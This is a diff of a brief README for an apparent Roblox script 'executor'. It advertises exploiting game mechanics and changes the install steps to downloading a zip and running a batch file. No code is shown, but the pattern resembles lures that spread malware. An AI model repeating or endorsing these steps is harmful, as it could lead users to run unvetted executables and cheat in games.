@@ -1,6 +1,6 @@
 ReconV2-Executor Welcome to the Solara Executor repository! 🚀 This repository hosts the latest version of the ReconV2 Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-Installation 1.Download Loader.aip 2.Run Loader.exe 3.enjoy
+Installation 1.Download Recon.zip 2.Run ReconV2.bat 3.enjoy
 
 Introduction ReconV2 Executor is a cutting-edge executor designed for Roblox script execution. With a wide range of functionalities tailored to Roblox users, this executor empowers you to control various aspects of your gameplay and enhance your overall gaming experience. Whether you are looking to exploit game mechanics for fun or experiment with advanced scripting techniques, ReconV2 Executor has you covered.
 
